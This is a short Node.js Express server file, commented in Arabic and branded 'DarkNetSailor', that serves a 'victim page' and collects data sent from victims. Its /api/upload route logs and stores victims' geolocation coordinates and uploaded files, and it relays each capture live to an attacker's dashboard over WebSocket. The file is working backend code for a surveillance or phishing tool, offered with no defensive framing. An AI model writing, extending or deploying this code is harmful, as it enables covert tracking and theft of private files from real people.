const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// إعداد CORS والملفات الثابتة
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '50mb' }));

// إعداد Multer لحفظ الملفات
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'uploads/');
    },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });

// إعداد WebSocket للوحة التحكم
const server = app.listen(PORT, () => {
    console.log(`[+] DarkNetSailor Server running on port ${PORT}`);
    console.log(`[+] Open http://localhost:${PORT} to view the victim page.`);
});
const wss = new WebSocket.Server({ server });

// دالة لإرسال إشعار للوحة التحكم
function notifyDashboard(type, message) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type, message, time: new Date().toISOString() }));
        }
    });
}

// مسار استقبال البيانات من الضحية
app.post('/api/upload', upload.single('file'), (req, res) => {
    const { type, lat, lon, accuracy } = req.body;
    
    if (type === 'location') {
        console.log(`[📍] Location Received: Lat ${lat}, Lon ${lon} (Accuracy: ${accuracy}m)`);
        notifyDashboard('location', { lat, lon, accuracy });
    } else if (req.file) {
        console.log(`[📁] File Received: ${req.file.filename} (Type: ${type})`);
        notifyDashboard(type, `File saved: ${req.file.filename}`);
    }
    
    res.status(200).send('OK');
});

// مسار WebSocket للوحة التحكم
wss.on('connection', (ws) => {
    console.log('[*] Dashboard connected to WebSocket.');
});
